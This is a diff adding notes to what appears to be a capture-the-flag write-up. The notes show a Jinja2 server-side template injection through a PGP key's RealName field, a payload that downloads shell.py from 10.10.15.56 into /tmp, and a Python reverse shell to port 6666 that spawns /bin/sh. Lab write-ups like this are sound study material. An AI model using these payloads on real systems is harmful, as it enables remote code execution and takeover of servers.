@@ -50,4 +50,18 @@ https://www.wired.co.uk/article/efail-pgp-vulnerability-outlook-thunderbird-smim
 
 https://efail.de/
 
+we can use a ssti (sever side template injection) by using the RealName of the public key generated and verifying signature of message\
+by using {{ 7 * 7 }} for example, we can see that the code is executed cause we have a web template engine named jinja2 (in python)\
+
+So to get a reverse shell, we can use this crafted payload:
+
+{{self.__init__.__globals__.__builtins__.__import__('os').system('wget http://10.10.15.56:8000/shell.py -O /tmp/shell.py')}}
+
+import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.15.56",6666));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/sh");
 
